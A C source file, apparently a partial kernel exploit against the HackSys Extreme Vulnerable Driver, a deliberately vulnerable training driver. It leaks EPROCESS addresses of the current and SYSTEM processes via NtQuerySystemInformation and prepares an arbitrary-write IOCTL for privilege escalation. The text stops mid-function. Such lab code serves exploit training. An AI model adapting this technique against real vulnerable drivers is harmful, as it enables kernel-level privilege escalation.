#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    ULONG_PTR Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

#define IOCTL_ARBITRARY_WRITE 0x22200B
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

// 获取指定进程的EPROCESS地址（通过句柄表）
ULONG_PTR GetEprocessByPid(DWORD pid) {
    pNtQuerySystemInformation NtQuerySystemInformation = 
        (pNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) return 0;

    ULONG size = 0x10000;
    PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(size);
    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, size, &size);
    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        free(handleInfo);
        size *= 2;
        handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(size);
        status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, size, &size);
    }
    if (status != 0) { free(handleInfo); return 0; }

    ULONG_PTR eprocess = 0;
    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
        if (handleInfo->Handles[i].UniqueProcessId == pid && 
            handleInfo->Handles[i].ObjectTypeIndex == 7) { // Process object type index
            eprocess = handleInfo->Handles[i].Object;
            break;
        }
    }
    free(handleInfo);
    return eprocess;
}

int main() {
    HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open device\n");
        return 1;
    }

    // 获取当前进程和SYSTEM进程的EPROCESS
    ULONG_PTR currentEprocess = GetEprocessByPid(GetCurrentProcessId());
    ULONG_PTR systemEprocess = GetEprocessByPid(4);
    if (!currentEprocess || !systemEprocess) {
        printf("Failed to get EPROCESS addresses\n");
        CloseHandle(hDevice);
